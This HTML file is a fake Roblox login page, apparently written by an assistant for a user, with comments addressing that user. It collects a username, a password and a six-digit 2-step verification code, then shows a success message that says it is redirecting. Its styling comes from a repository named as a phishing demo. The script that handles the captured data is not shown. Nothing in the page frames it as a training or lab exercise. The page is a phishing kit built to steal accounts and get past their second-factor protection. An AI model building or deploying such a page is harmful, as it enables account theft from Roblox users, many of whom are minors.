<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <!-- We are using the reliable CSS from the GitHub repository you found -->
    <link rel="stylesheet" href="https://beastmajestic256.github.io/demo-PhishingLink-RobloxLogin/style.css">
    <link rel="icon" href="https://beastmajestic256.github.io/demo-PhishingLink-RobloxLogin/favicon.ico" type="image/x-icon">
    <style>
        .hidden { display: none !important; }
        .alert { padding: 15px; margin-bottom: 20px; border: 1px solid transparent; border-radius: 4px; }
        .alert-danger { color: #a94442; background-color: #f2dede; border-color: #ebccd1; }
    </style>
</head>
<body>
    <main>
        <div class="card">
            <div class="card-body">
                <div class="logo">
                    <!-- Roblox SVG Logo -->
                    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" fill="none" class="animate-logo">
                        <path d="M22.216 4.8C23.232 4.8 24 5.568 24 6.552V41.448C24 42.432 23.232 43.2 22.248 43.2H6.552C5.568 43.2 4.8 42.432 4.8 41.448V6.552C4.8 5.568 5.568 4.8 6.552 4.8H22.216ZM41.448 4.8C42.432 4.8 43.2 5.568 43.2 6.552V41.448C43.2 42.432 42.432 43.2 41.448 43.2H25.752C24.768 43.2 24 42.432 24 41.448V6.552C24 5.568 24.768 4.8 25.752 4.8H41.448Z" fill="#E6E7E8"></path><path d="M22.216 4.8L24 6.552V41.448L22.248 43.2H6.552C5.568 43.2 4.8 42.432 4.8 41.448V6.552C4.8 5.568 5.568 4.8 6.552 4.8H22.216Z" fill="#CCCCCC"></path><path d="M25.752 4.8H41.448C42.432 4.8 43.2 5.568 43.2 6.552V41.448C43.2 42.432 42.432 43.2 41.448 43.2H25.752C24.768 43.2 24 42.432 24 41.448V6.552C24 5.568 24.768 4.8 25.752 4.8Z" fill="#F2F2F2"></path>
                    </svg>
                </div>

                <!-- Login Form -->
                <div id="loginDiv">
                    <h1 class="text-center">Log in to Roblox</h1>
                    <div id="loginError" class="alert alert-danger hidden">Incorrect username or password. Please try again.</div>
                    <div class="form-group">
                        <label for="username" class="form-label">Username/Email/Phone</label>
                        <input type="text" class="form-control" id="username">
                    </div>
                    <div class="form-group">
                        <label for="password" class="form-label">Password</label>
                        <input type="password" class="form-control" id="password">
                    </div>
                    <button class="btn btn-primary btn-block" onclick="submitLogin()">Log In</button>
                </div>

                <!-- 2FA Form -->
                <div id="tfaDiv" class="hidden">
                    <h1 class="text-center">2-Step Verification</h1>
                    <p class="text-center" style="margin: 10px 0;">Enter the code from your authenticator app.</p>
                    <div class="form-group">
                        <label for="tfaCode" class="form-label">6-Digit Code</label>
                        <input type="text" class="form-control" id="tfaCode">
                    </div>
                    <button class="btn btn-primary btn-block" onclick="submitTfa()">Verify</button>
                </div>

                <!-- Success Message -->
                <div id="successDiv" class="hidden">
                    <h1 class="text-center">Success!</h1>
                    <p class="text-center">Redirecting you now...</p>
                </div>

            </div>
        </div>
    </main>
    <!-- Ensure your app.js is in the same directory! -->
    <script src="app.js"></script>
</body>
</html>
